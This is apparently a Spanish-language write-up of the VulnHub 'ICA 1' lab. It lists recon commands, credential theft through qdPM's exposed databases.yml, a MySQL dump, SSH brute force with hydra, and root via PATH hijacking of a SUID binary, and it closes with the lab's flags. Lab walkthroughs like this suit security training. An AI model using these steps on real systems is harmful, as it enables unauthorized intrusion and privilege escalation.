---
tags:
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/entry/ica-1,748/
dificultad: Fácil
os: Linux
relacionados:
  - "[[whatweb]]"
  - "[[MariaDB]]"
  - "[[PATH Hijacking]]"
  - "[[SUID]]"
  - "[[hydra]]"
---
# Vulnhub - ICA 1

Si hay problemas en la configuración usar el [[Obtener login en os linux sin contraseña]] y luego modificar el `/etc/network/interfaces` y cambiar las interfaces de las dos ultimas lineas por las nuestra. 

Antes:
```bash
allow hotplug enpos3
iface_enpos3 inet dhcp
```
Despues:
```bash
allow hotplug ens33
iface_ens33 inet dhcp
```

Para salir y guardar se puede usar `F10` o `ctrl+x`
## Reconocimiento

### Identificación de la IP de la máquina víctima

- Escaneo de red local:
    ```bash
    arp-scan -I <interfaz_de_red> --localnet
    ```
    
- Verificación de conectividad:
    ```bash
    ping -c 1 <ip_victima>
    ```

- Confirmación del TTL para identificar el sistema operativo.

### Escaneo de puertos

- Escaneo rápido de puertos:
    ```bash
    nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <ip_victima>
    ```
    
- Escaneo detallado de servicios:
    ```bash
    nmap -sCV -p22,80,3306,33060 <ip_victima>
    ```

### Análisis del sitio web

- Identificación de tecnologías con WhatWeb:
    ```bash
    whatweb http://<ip_victima>
    ```
    
- Reconocimiento del servicio HTTP (qdPM v9.2).


---

## Análisis de vulnerabilidades

### Búsqueda de exploits

- Buscar vulnerabilidades conocidas:
    ```bash
    searchsploit qdPM 9.2
    ```
    
- Revisar detalles del exploit encontrado:
    ```bash
    searchsploit -x php/webapps/50176.txt
    ```
    
### Explotación inicial de qdPM

- Descargar el archivo vulnerable:
    ```bash
    curl http://<ip_victima>/core/config/databases.yml -o databases.yml
    ```
    
- Extraer credenciales del archivo `databases.yml`.

### Acceso a MySQL

- Conectar con las credenciales extraídas:
    ```bash
    mysql -u qdpmadmin -h <ip_victima> -p
    ```
En caso de que no funcione por pedir certificado ssl:
```
mysql -u qdpmadmin -h $(cat ip) -p --ssl --ssl-verify-server-cert=FALSE
```

- Enumerar bases de datos y tablas:
    
    ```sql
    show databases;
    use staff;
    show tables;
    select * from user;
    select * from login;
    ```
    
- Decodificar contraseñas en Base64:
    ```bash
	for i in $(cat passwords_base64.txt ); do echo $i | base64 -d ; echo; done > passwords.txt
    ```
    

---

## Explotación de vulnerabilidades

### Ataque de fuerza bruta SSH

- Ejecutar Hydra con usuarios y contraseñas extraídos:
    ```bash
    hydra -L usuarios.txt -P passwords.txt ssh://<ip_victima>
    ```
    
- Credenciales descubiertas:
    - Usuario: **travis**
    - Contraseña: ****

### Acceso inicial

- Conexión por SSH:
    ```bash
    ssh travis@<ip_victima>
    ```
    
- Lectura de la primera bandera:
    ```bash
    cat user.txt
    ```
    

---

## Escalada de privilegios

### Identificación de binarios SUID

- Buscar binarios con permisos SUID:
    ```bash
    find / -perm -4000 -user root 2>/dev/null
    ```
    
- Identificación de `/opt/get_access`.

### Análisis del binario

- Examinar contenido del binario:
    ```bash
    strings /opt/get_access
    ```
    
- Vulnerabilidad detectada: uso del comando `cat` sin ruta absoluta.

### Secuestro del PATH

- Crear un archivo `cat` malicioso:
    ```bash
    cd /tmp
    echo "chmod u+s /bin/bash" > cat
    chmod +x cat
    ```
    
- Modificar el PATH:
    ```bash
    export PATH=/tmp:$PATH
    ```
    
- Ejecutar el binario:
    ```bash
    /opt/get_access
    ```

### Acceso como root

- Iniciar shell privilegiada:
    ```bash
    bash -p
    ```
    
- Leer la bandera final    
    ```bash
    cat /root/root.txt
    ```


---

## Bandera(s)

> [!flag] `flag{user}`
> ICA{Secret_Project}
^bandera-user

> [!flag] `flag{root}`
> ICA{Next_Generation_Self_Renewable_Genetics}
^bandera-root

